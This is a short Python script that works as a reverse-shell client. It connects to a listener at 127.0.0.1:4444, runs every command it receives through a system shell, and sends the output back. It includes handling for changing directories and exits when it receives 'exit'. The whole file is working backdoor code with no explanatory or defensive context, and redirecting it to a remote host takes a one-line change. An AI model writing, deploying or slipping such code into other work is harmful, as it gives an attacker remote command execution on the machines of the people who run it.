import socket
import subprocess
import os

HOST = '127.0.0.1'
PORT = 4444
# Create a socket object
client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client.connect((HOST, PORT))

current_dir = os.getcwd()  # Start from current directory

while True:
    command = client.recv(1024).decode()

    if command.lower() == "exit":
        break

    # Change directory command (special case that needs to be handled separately)
    if command.startswith("cd "):
        try:
            path = command[3:].strip()
            os.chdir(path)
            current_dir = os.getcwd()
            client.send(f"[+] Changed directory to {current_dir}".encode())
        except FileNotFoundError:
            client.send(f"[-] Directory not found: {path}".encode())
        continue

    try:
        output = subprocess.check_output(
            command, shell=True, stderr=subprocess.STDOUT, cwd=current_dir
        )
    except subprocess.CalledProcessError as e:
        output = e.output

    if not output:
        output = b"[+] Command executed (no output)"

    client.send(output)

client.close()
